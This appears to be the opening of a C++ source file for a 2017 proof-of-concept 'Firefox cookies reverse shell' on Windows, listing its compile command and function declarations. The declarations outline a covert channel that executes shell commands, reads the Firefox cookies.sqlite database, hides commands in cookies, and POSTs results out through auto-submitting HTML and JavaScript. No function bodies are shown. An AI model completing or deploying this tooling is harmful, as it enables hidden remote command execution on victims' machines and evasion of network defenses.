/*
Firefox's cookies reverse shell - PoC version - THis is Server
Coded by CoolerVoid - 17/12/2017

To compile:
	c++ -o test test.cpp utils.cpp sqlite.o
	
	
*/
#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <string>
#include <vector>
#include <stdio.h>  
#include <stdlib.h>  
#include "lib/sqlite3.h"
#include <ShellApi.h>
#include <stdexcept>
#include <sstream>
using namespace std;

extern std::string domain;

static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static inline bool is_base64(unsigned char c);
std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
std::string base64_decode(std::string const& encoded_string);	
std::string readfile(const std::string &filepath); 
std::string exec_command(std::string cmd); 
std::string get_windows_username();
std::string get_default_firefox_profiledir(const std::string& name);
std::string get_firefox_sqlite_path();
void write_cmd_cookie(); // write  cmd command in cookie
void Write_File(std::string filename, std::string buf); 
void construct_html(std::string result_cmd, std::string filename); // write html to auto js to POST, to send result of CMD
void send_result_cmd(std::string html_file);
static int callback(void *data, int argc, char **argv, char **azColName); // result of select query in cookies.sqlite
void start_cookie_tunnel();

